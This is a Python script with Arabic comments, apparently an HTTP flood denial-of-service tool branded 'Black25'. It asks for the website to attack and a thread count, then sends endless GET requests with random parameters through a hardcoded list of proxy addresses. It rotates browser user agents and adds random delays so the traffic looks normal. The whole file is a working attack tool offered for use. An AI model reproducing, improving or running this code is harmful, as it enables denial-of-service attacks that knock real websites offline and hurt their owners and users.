import threading
import requests
import random
import string
import time
from colorama import Fore, Style, init

# تهيئة colorama
init(autoreset=True)

# دالة لإنشاء بيانات عشوائية لإرسالها كمعاملات GET
def random_string(length=8):
    letters = string.ascii_letters
    return ''.join(random.choice(letters) for i in range(length))

# دالة لإنشاء رأس HTTP واقعي
def random_headers():
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
        # إضافة المزيد من وكلاء المستخدم هنا
    ]
    headers = {
        'User-Agent': random.choice(user_agents),
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive'
    }
    return headers

# دالة لتنفيذ طلب HTTP GET مع معاملات عشوائية ورؤوس وكيلة
def perform_attack(target_url, proxies_list):
    try:
        while True:
            params = {random_string(): random_string() for _ in range(5)}  # إنشاء 5 معاملات عشوائية
            proxy = {'http': random.choice(proxies_list)}
            headers = random_headers()
            response = requests.get(target_url, params=params, proxies=proxy, headers=headers)
            print(f"{Fore.RED}Request sent: {response.status_code}, Params: {params}, Proxy: {proxy['http']}, Headers: {headers['User-Agent']}")
            time.sleep(random.uniform(0.05, 0.2))  # إضافة تأخير عشوائي لتقليل الحمل وجعل الطلبات تبدو طبيعية
    except Exception as e:
        print(f"Error: {e}")

# دالة رئيسية لبدء الهجوم
def main():
    try:
        # عرض اسم Black25 عند تشغيل الأداء
        print(f"{Fore.GREEN}Black25 🥷🏻🥷🏻⚔️⚔️⚔️⚔️ \n🪦🔞😈👿😈😈😈\ni love you🦠🦠🦠🦠🦠🦠\n🃏🃏🃏🃏Ly")

        # طلب إدخال عنوان URL المستهدف من المستخدم
        target_url = input(f"{Fore.YELLOW}موقع الذي تريد الهجوم علية: ")

        # تحقق من صحة عنوان URL
        if not target_url.startswith('http://') and not target_url.startswith('https://'):
            raise ValueError("Invalid URL. Please enter a valid URL.")

        # قائمة بعناوين الوكلاء (يجب أن تكون عناوين وكلاء حقيقية)
        proxies_list = [
            'http://51.158.68.133:8811', 'http://178.128.163.157:3128', 'http://167.172.180.46:3128',
            'http://138.197.157.44:8080', 'http://165.22.254.197:8080', 'http://165.22.254.199:8080',
            'http://178.128.21.224:8080', 'http://165.227.215.62:3128', 'http://157.245.207.186:8080',
            'http://51.158.123.35:8811', 'http://51.158.68.26:8811', 'http://51.158.119.88:8811',
            'http://51.158.98.121:8811', 'http://51.158.186.141:8811', 'http://51.158.123.249:8811',
            'http://51.158.108.135:8811', 'http://51.158.120.84:8811', 'http://51.158.68.68:8811',
            'http://51.158.99.51:8811', 'http://51.158.98.121:8811', 'http://51.158.123.35:8811',
            'http://51.158.123.35:8811', 'http://51.158.119.88:8811', 'http://51.158.108.135:8811',
            'http://51.158.120.84:8811', 'http://51.158.123.249:8811', 'http://51.158.186.141:8811',
            'http://51.158.123.35:8811', 'http://51.158.68.133:8811', 'http://51.158.186.141:8811',
            'http://192.168.1.2:8080', 'http://192.168.1.3:8080', 'http://192.168.1.4:8080',
            # إضافة المزيد من الوكلاء الحقيقيين هنا
        ]

        # طلب إدخال عدد مؤشرات الترابط من المستخدم
        num_threads = int(input(f"{Fore.YELLOW}عدد الطلبات التي تريدها: "))

        # إنشاء وإطلاق مؤشرات الترابط
        threads = []
        for i in range(num_threads):
            thread = threading.Thread(target=perform_attack, args=(target_url, proxies_list))
            thread.start()
            threads.append(thread)

        # الانضمام إلى مؤشرات الترابط (اختياري)
        for thread in threads:
            thread.join()

    except ValueError as ve:
        print(ve)
    except KeyboardInterrupt:
        print(f"{Fore.RED}\nExecution stopped by user.")
    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    main()
